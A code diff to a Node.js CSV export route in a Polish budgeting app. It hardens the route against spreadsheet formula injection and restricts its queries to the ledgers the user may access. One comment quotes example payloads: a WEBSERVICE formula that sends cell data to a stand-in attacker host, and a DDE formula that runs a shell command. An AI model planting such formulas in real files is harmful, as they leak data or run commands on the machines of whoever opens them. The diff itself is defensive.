@@ -3,6 +3,7 @@
 // dopóki Szymon go nie włączy w Adminie, endpoint odpowiada 503, nie ciągnie danych.
 const express = require('express');
 const { q } = require('../db');
+const { ledgerScope } = require('../auth');
 const { czyData } = require('../ocr/pola');
 const { wymagajModalnosci } = require('../wylaczniki');
 const { zapiszDostep } = require('../rejestr');
@@ -28,10 +29,20 @@ const ZRODLA = ['MANUAL', 'CSV', 'RECEIPT', 'MIGRACJA'];
 // ---------- CSV: nagłówki PL, średnik (Excel PL), BOM, kwota z przecinkiem ----------
 const BOM = '﻿';
 
+// Komórka zaczynająca się od =, +, -, @, TABEM albo CR jest przez Excel/Sheets INTERPRETOWANA
+// jako formuła (CSV injection): opis wpisu `=WEBSERVICE("https://zly.pl/?d="&A1)` albo DDE
+// `=cmd|'/c calc'!A1` wykona się w arkuszu admina, który otworzy ten eksport. Wiersz księgi
+// to dane od LUDZI (opis transakcji, nazwa produktu) — traktujemy go jak dane niezaufane.
+// Apostrof na początku każe Excelowi pokazać wartość jako TEKST, nie policzyć jej.
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
 // Pole trafia w cudzysłów, gdy zawiera separator, cudzysłów albo nową linię — inaczej
-// opis z przecinkiem/średnikiem rozjeżdżałby kolumny w Excelu.
+// opis z przecinkiem/średnikiem rozjeżdżałby kolumny w Excelu. Neutralizacja formuły
+// dzieje się PRZED tym sprawdzeniem, żeby dodany apostrof też trafił pod cudzysłów,
+// gdyby reszta pola tego wymagała.
 function pole(v) {
-  const s = v === null || v === undefined ? '' : String(v);
+  let s = v === null || v === undefined ? '' : String(v);
+  if (FORMULA_PREFIX.test(s)) s = `'${s}`;
   if (/[;"\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 }
@@ -50,10 +61,14 @@ function wyslijCsv(res, nazwa, tresc) {
 }
 
 // ---------- zapytania per zbiór ----------
+// KAŻDE zapytanie zawęża się do ksiąg z ledgerScope(req.user) — dziś admin ma zawsze [1,2],
+// więc filtr nic nie odcina w praktyce, ale eksport NIE MA polegać na tym, że jedyna rola,
+// która tu dochodzi, to admin: gdyby kiedyś ta trasa otworzyła się dla innej roli (albo
+// admin-check wyżej padł ofiarą sabotażu), zapytanie samo z siebie ma trzymać zasięg.
 
-async function pobierzKsiege(od, doD, source) {
+async function pobierzKsiege(od, doD, source, ledgers) {
   const params = { od, doD };
-  let where = 't.deleted_at IS NULL AND t.tx_date BETWEEN :od AND :doD';
+  let where = `t.ledger_id IN (${ledgers.join(',')}) AND t.deleted_at IS NULL AND t.tx_date BETWEEN :od AND :doD`;
   if (source) { where += ' AND t.source = :source'; params.source = source; }
   const rows = await q(
     `SELECT t.tx_date, l.name AS ksiega, t.type, t.amount, t.currency, c.name AS kategoria,
@@ -71,7 +86,7 @@ async function pobierzKsiege(od, doD, source) {
   };
 }
 
-async function pobierzProdukty(od, doD) {
+async function pobierzProdukty(od, doD, ledgers) {
   const rows = await q(
     `SELECT p.name, p.unit, pc.name AS kategoria,
             COUNT(*) AS zakupow, ROUND(SUM(i.quantity), 3) AS ilosc,
@@ -80,7 +95,7 @@ async function pobierzProdukty(od, doD) {
        JOIN receipts r ON r.id = i.receipt_id
        JOIN products p ON p.id = i.product_id
        LEFT JOIN product_categories pc ON pc.id = p.product_category_id
-      WHERE r.receipt_date BETWEEN :od AND :doD
+      WHERE r.ledger_id IN (${ledgers.join(',')}) AND r.receipt_date BETWEEN :od AND :doD
       GROUP BY p.id ORDER BY wydano DESC`, { od, doD });
   return {
     naglowki: ['Produkt', 'Jednostka', 'Kategoria produktowa', 'Zakupy', 'Ilość', 'Wydano', 'Rabaty'],
@@ -89,6 +104,9 @@ async function pobierzProdukty(od, doD) {
   };
 }
 
+// telemetry NIE MA kolumny ledger_id (to telemetria UŻYCIA aplikacji, nie wpis księgowy) —
+// nie ma po czym zawężać do ksiąg, więc scope tutaj nie wchodzi w WHERE. Admin-only wyżej
+// i tak jest jedynym zabezpieczeniem tego zbioru, tak jak w /reports/telemetry.
 async function pobierzTelemetrie(od, doD) {
   const rows = await q(
     `SELECT ts, user_name, view_name, action, duration_s, offline, detail
@@ -108,21 +126,24 @@ router.get('/csv', async (req, res, next) => {
     if (!ZBIORY.includes(zbior)) return res.status(400).json({ error: 'bad_zbior', dozwolone: ZBIORY });
     const od = czyData(req.query.od), doD = czyData(req.query.do);
     if (!od || !doD || od > doD) return res.status(400).json({ error: 'bad_period' });
+    const ledgers = ledgerScope(req.user).ledgers;
+    if (!ledgers.length) return res.status(403).json({ error: 'ledger_forbidden' });
 
     let dane;
     if (zbior === 'ksiega') {
-      dane = await pobierzKsiege(od, doD, null);
+      dane = await pobierzKsiege(od, doD, null, ledgers);
     } else if (zbior === 'konto') {
       const konto = String(req.query.konto || '');
       if (!ZRODLA.includes(konto)) return res.status(400).json({ error: 'bad_konto', dozwolone: ZRODLA });
-      dane = await pobierzKsiege(od, doD, konto);
+      dane = await pobierzKsiege(od, doD, konto, ledgers);
     } else if (zbior === 'produkty') {
-      dane = await pobierzProdukty(od, doD);
+      dane = await pobierzProdukty(od, doD, ledgers);
     } else {
       dane = await pobierzTelemetrie(od, doD);
     }
 
-    zapiszDostep('eksport_csv', zbior, `${od}..${doD}`, dane.wiersze.length, null);
+    // Konwencja endpointu w access_log: '<trasa>:<zbior>' (patrz też reports.js 'widget:/summary').
+    zapiszDostep('eksport_csv', `csv:${zbior}`, `${od}..${doD}`, dane.wiersze.length, null);
     wyslijCsv(res, `eksport-${zbior}-${od}_${doD}.csv`, csv(dane.naglowki, dane.wiersze));
   } catch (e) { next(e); }
 });
@@ -134,3 +155,5 @@ module.exports.csv = csv;
 module.exports.BOM = BOM;
 module.exports.ZBIORY = ZBIORY;
 module.exports.ZRODLA = ZRODLA;
+module.exports.pobierzKsiege = pobierzKsiege;     // eksport dla testu zawężenia po ledgerScope
+module.exports.pobierzProdukty = pobierzProdukty;
